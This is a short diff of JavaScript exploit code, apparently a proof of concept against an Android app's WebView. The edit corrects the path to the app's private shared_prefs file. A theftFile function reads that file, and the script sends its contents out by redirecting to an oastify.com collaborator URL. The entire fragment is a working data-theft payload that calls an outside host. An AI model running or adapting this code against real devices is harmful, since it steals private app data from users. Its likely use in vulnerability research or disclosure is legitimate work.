@@ -12,7 +12,7 @@
       req.send();
     }
 
-    var file = "file///data/data/com.oceanwing.FDMPrint/shared_prefs/eufy_policy_accept_table.xml";
+    var file = "/data/data/com.oceanwing.FDMPrint/shared_prefs/eufy_policy_accept_table.xml";
 
     theftFile(file, function(contents) {
         location.href = "http://lazur24teepff6c4lfpghdm8ezkq8vwk.oastify.com/?data=" + encodeURIComponent(contents);
